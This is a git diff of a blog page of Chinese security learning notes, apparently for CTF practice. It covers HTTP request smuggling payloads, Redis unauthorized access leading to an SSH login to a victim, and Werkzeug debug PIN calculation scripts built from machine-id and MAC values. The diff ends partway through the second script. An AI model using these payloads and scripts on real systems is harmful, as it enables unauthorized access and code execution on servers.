@@ -4,9 +4,9 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="破破烂烂碎碎知识汇总, Jlan&#39;s Little World">
+    <meta name="keywords" content="破破烂烂碎碎知识汇总, J1an&#39;s Little World">
     <meta name="description" content="HTTP部分请求头Transfer-Encoding其中中有一类特定编码:chunked编码.该编码将实体分块传送并逐块标明长度,直到长度为0块表示传输结束, 这在实体长度未知时特别有用(比如由数据库动态产生的数据)，该编码格式为
-1234">
+Tran">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +18,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>破破烂烂碎碎知识汇总 | Jlan&#39;s Little World</title>
+    <title>破破烂烂碎碎知识汇总 | J1an&#39;s Little World</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -46,8 +46,6 @@
 
 
     
-        <link rel="stylesheet" type="text/css" href="/css/reward.css">
-    
 
 
 
@@ -65,7 +63,7 @@
                     
                     <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                     
-                    <span class="logo-span">Jlan&#39;s Little World</span>
+                    <span class="logo-span">J1an&#39;s Little World</span>
                 </a>
             </div>
             
@@ -86,55 +84,11 @@
   
   <li class="hide-on-med-and-down nav-item">
     
-    <a href="/tags" class="waves-effect waves-light">
-      
-      <i class="fas fa-tags" style="zoom: 0.6;"></i>
-      
-      <span>标签</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/categories" class="waves-effect waves-light">
-      
-      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
-      
-      <span>分类</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
     <a href="/archives" class="waves-effect waves-light">
       
       <i class="fas fa-archive" style="zoom: 0.6;"></i>
       
       <span>归档</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/about" class="waves-effect waves-light">
-      
-      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
-      
-      <span>关于</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/contact" class="waves-effect waves-light">
-      
-      <i class="fas fa-comments" style="zoom: 0.6;"></i>
-      
-      <span>留言板</span>
     </a>
     
   </li>
@@ -169,7 +123,7 @@
         
         <img src="/medias/logo.png" class="logo-img circle responsive-img">
         
-        <div class="logo-name">Jlan&#39;s Little World</div>
+        <div class="logo-name">J1an&#39;s Little World</div>
         <div class="logo-desc">
             
             Never really desperate, only the lost of the soul.
@@ -192,55 +146,11 @@
         
         <li class="m-nav-item">
 	  
-		<a href="/tags" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-tags"></i>
-			
-			标签
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/categories" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-bookmark"></i>
-			
-			分类
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
 		<a href="/archives" class="waves-effect waves-light">
 			
 			    <i class="fa-fw fas fa-archive"></i>
 			
 			归档
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/about" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-user-circle"></i>
-			
-			关于
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/contact" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-comments"></i>
-			
-			留言板
 		</a>
           
         </li>
@@ -392,13 +302,22 @@
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
+        
 
         
 
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h2 id="HTTP部分请求头"><a href="#HTTP部分请求头" class="headerlink" title="HTTP部分请求头"></a>HTTP部分请求头</h2><h3 id="Transfer-Encoding"><a href="#Transfer-Encoding" class="headerlink" title="Transfer-Encoding"></a>Transfer-Encoding</h3><p>其中中有一类特定编码:chunked编码.该编码将实体分块传送并逐块标明长度,直到长度为0块表示传输结束, 这在实体长度未知时特别有用(比如由数据库动态产生的数据)，该编码格式为</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line">16进制表示下一个分块的长度\r\n</span><br><span class="line">要发送的数据\r\n</span><br><span class="line">重复上列数据直到最终结尾使用一个空的数据块来表示内容结束</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">Transfer-Encoding: chunked\r\n
+\r\n
+16进制表示下一个分块的长度\r\n
+要发送的数据\r\n
+重复上列数据直到最终结尾使用一个空的数据块来表示内容结束
+0\r\n
+\r\n<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <span id="more"></span>
 
@@ -412,25 +331,59 @@
 <h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><ol>
 <li><p>CL不为0的GET请求</p>
 <p>当前端服务器允许GET请求携带请求体，而后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的 <code>Content-Length</code> 头，不进行处理。例如下面这个例子：</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>example.com\r\n</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>44\r\n</span><br><span class="line"></span><br><span class="line">GET /secret HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>example.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span>\r\n
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">example.com\r\n</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">44\r\n</span></span>
+
+<span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/secret</span> <span class="token http-version property">HTTP/1.1</span></span>\r\n
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">example.com\r\n</span></span>
+\r\n<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>这时前端对 <code>Content-Length</code> 头进行了处理，将后续伪造的GET请求传入了后端，而后端则没有处理，直接将下面的内容当做了又一个独立请求进行处理</p>
 </li>
 <li><p>双CL值不同的请求</p>
 <p>根据RFC 7230，当服务器收到的请求中包含两个 <code>Content-Length</code> ，而且两者的值不同时，需要返回400错误，但是有的服务器并没有严格实现这个规范。这种情况下，当前后端各取不同的 <code>Content-Length</code> 值时，就会出现漏洞。例如：</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>example.com\r\n</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>8\r\n</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>7\r\n</span><br><span class="line"></span><br><span class="line">12345\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span>\r\n
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">example.com\r\n</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">8\r\n</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">7\r\n</span></span>
+
+12345\r\n
+a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>这个例子中的a就会被带入到下一个请求中，使得下一个请求变成了</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aGET / HTTP/1.1\r\n</span><br></pre></td></tr></table></figure></li>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http">aGET / HTTP/1.1\r\n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 <li><p>CL-TE</p>
 <p>指前端服务器处理 <code>Content-Length</code> 这一请求头，而后端服务器遵守RFC2616的规定，忽略掉 <code>Content-Length</code> ，处理 <code>Transfer-Encoding</code> 。例如：</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>example.com\r\n</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>4\r\n</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line">12\r\n</span><br><span class="line">aPOST / HTTP/1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span>\r\n
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">example.com\r\n</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">4\r\n</span></span>
+<span class="token header"><span class="token header-name keyword">Transfer-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">chunked\r\n</span></span>
+\r\n
+12\r\n
+aPOST / HTTP/1.1\r\n
+\r\n
+0\r\n
+\r\n<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>此处前端只处理了 <code>Content-Length</code> 这一请求头而忽略了 <code>Transfer-Encoding</code> 请求头</p>
 </li>
 <li><p>TE-TE</p>
 <p>指前后端服务器都处理 <code>Transfer-Encoding</code> 请求头，但是在容错性上表现不同，例如有的服务器可能会处理 <code>Transfer-encoding</code> ，测试例如：</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>example.com\r\n</span><br><span class="line"><span class="attribute">Content-length</span><span class="punctuation">: </span>4\r\n</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked\r\n</span><br><span class="line"><span class="attribute">Transfer-encoding</span><span class="punctuation">: </span>cow\r\n</span><br><span class="line">\r\n</span><br><span class="line">5c\r\n</span><br><span class="line">aPOST / HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded\r\n</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>15\r\n</span><br><span class="line">\r\n</span><br><span class="line">x=1\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure></li>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span>\r\n
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">example.com\r\n</span></span>
+<span class="token header"><span class="token header-name keyword">Content-length</span><span class="token punctuation">:</span> <span class="token header-value">4\r\n</span></span>
+<span class="token header"><span class="token header-name keyword">Transfer-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">chunked\r\n</span></span>
+<span class="token header"><span class="token header-name keyword">Transfer-encoding</span><span class="token punctuation">:</span> <span class="token header-value">cow\r\n</span></span>
+\r\n
+5c\r\n
+aPOST / HTTP/1.1\r\n
+<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded\r\n</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">15\r\n</span></span>
+\r\n
+x=1\r\n
+0\r\n
+\r\n<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
 </ol>
 <h2 id="PHP-session反序列化"><a href="#PHP-session反序列化" class="headerlink" title="PHP session反序列化"></a>PHP session反序列化</h2><h2 id="Redis未授权访问"><a href="#Redis未授权访问" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h2><p>其实并不是CVE，但也是个蛮有趣的漏洞，众所周知redis和memcached这俩难兄难弟是不需要密码的，但是他们同时又有很高的权限，所以当这俩货对外网开启访问权限的时候就很容易被扫描到并且被搞，那么话不多说，开干！</p>
 <p>利用条件：Redis开放给外部访问并且知道ssh链接端口</p>
@@ -443,9 +396,92 @@
 <li>使用私钥直接连接受害者服务器<code>ssh -i ~/.ssh/id_rsa root@受害者IP -p SSH服务端口</code></li>
 </ol>
 <h2 id="Flask-PIN值计算"><a href="#Flask-PIN值计算" class="headerlink" title="Flask PIN值计算"></a>Flask PIN值计算</h2><p>直接放脚本算了</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#MD5 python3.6</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">     <span class="string">&#x27;flaskweb&#x27;</span><span class="comment"># flask执行用户</span></span><br><span class="line">     <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># 默认</span></span><br><span class="line">     <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># 默认</span></span><br><span class="line">     <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),报错也可</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">     <span class="string">&#x27;25214234362297&#x27;</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">     <span class="string">&#x27;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&#x27;</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">   h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">   num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">   <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">       <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">          rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                      <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">          rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#MD5 python3.6</span>
+<span class="token keyword">import</span> hashlib
+<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chain
+probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
+     <span class="token string">'flaskweb'</span><span class="token comment"># flask执行用户</span>
+     <span class="token string">'flask.app'</span><span class="token punctuation">,</span><span class="token comment"># 默认</span>
+     <span class="token string">'Flask'</span><span class="token punctuation">,</span><span class="token comment"># 默认</span>
+     <span class="token string">'/usr/local/lib/python3.7/site-packages/flask/app.py'</span> <span class="token comment"># getattr(mod, '__file__', None),报错也可</span>
+<span class="token punctuation">]</span>
 
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sha1 python3.8</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span><span class="comment"># /etc/passwd</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span> <span class="comment"># 报错得到</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377581187&#x27;</span>,<span class="comment">#  /sys/class/net/eth0/address 16进制转10进制</span></span><br><span class="line">    <span class="comment">#machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span></span><br><span class="line">    <span class="string">&#x27;653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd&#x27;</span><span class="comment">#  /proc/self/cgroup</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>
+private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
+     <span class="token string">'25214234362297'</span><span class="token punctuation">,</span><span class="token comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span>
+     <span class="token string">'0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa'</span><span class="token comment"># get_machine_id(), /etc/machine-id</span>
+<span class="token punctuation">]</span>
+
+h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>
+        <span class="token keyword">continue</span>
+    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
+    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>
+h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'cookiesalt'</span><span class="token punctuation">)</span>
+
+cookie_name <span class="token operator">=</span> <span class="token string">'__wzd'</span> <span class="token operator">+</span> h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span>
+
+num <span class="token operator">=</span> <span class="token boolean">None</span>
+<span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+   h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'pinsalt'</span><span class="token punctuation">)</span>
+   num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%09d'</span> <span class="token operator">%</span> <span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>
+
+rv <span class="token operator">=</span><span class="token boolean">None</span>
+<span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+   <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>
+       <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
+          rv <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>num<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>
+                      <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span><span class="token punctuation">)</span>
+          <span class="token keyword">break</span>
+       <span class="token keyword">else</span><span class="token punctuation">:</span>
+          rv <span class="token operator">=</span> num
+
+<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#sha1 python3.8</span>
+<span class="token keyword">import</span> hashlib
+<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chain
+probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
+    <span class="token string">'root'</span><span class="token comment"># /etc/passwd</span>
+    <span class="token string">'flask.app'</span><span class="token punctuation">,</span><span class="token comment"># 默认值</span>
+    <span class="token string">'Flask'</span><span class="token punctuation">,</span><span class="token comment"># 默认值</span>
+    <span class="token string">'/usr/local/lib/python3.8/site-packages/flask/app.py'</span> <span class="token comment"># 报错得到</span>
+<span class="token punctuation">]</span>
+
+private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
+    <span class="token string">'2485377581187'</span><span class="token punctuation">,</span><span class="token comment">#  /sys/class/net/eth0/address 16进制转10进制</span>
+    <span class="token comment">#machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span>
